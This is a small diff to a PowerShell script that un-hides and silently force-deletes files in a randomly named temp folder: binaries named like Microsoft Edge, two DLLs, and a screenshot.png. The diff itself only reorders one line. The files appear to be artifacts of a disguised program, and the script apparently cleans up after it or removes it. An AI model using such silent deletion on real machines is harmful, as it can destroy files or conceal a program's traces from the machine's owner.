@@ -4,11 +4,13 @@ $folderPath = "$env:temp/sVBXKuz/"
 $filePaths = @("$env:temp/sVBXKuz/msedge.exe", "$env:temp/sVBXKuz/libsodium.dll", "$env:temp/sVBXKuz/libopus.dll")
 $itemsToRemove = @("wsappa.exe", "msedge.exe", "microsoft_edge.exe", "libsodium.dll", "libopus.dll", "screenshot.png")
 
-Set-ItemProperty -Path $folderPath -Name Attributes -Value ([System.IO.FileAttributes]::Normal)
+
 
 foreach ($file in $filePaths) {
     Set-ItemProperty -Path $file -Name Attributes -Value ([System.IO.FileAttributes]::Normal)
 }
+
+Set-ItemProperty -Path $folderPath -Name Attributes -Value ([System.IO.FileAttributes]::Normal)
 
 foreach ($item in $itemsToRemove) {
     Remove-Item "$folderPath$item" -Force -ErrorAction SilentlyContinue
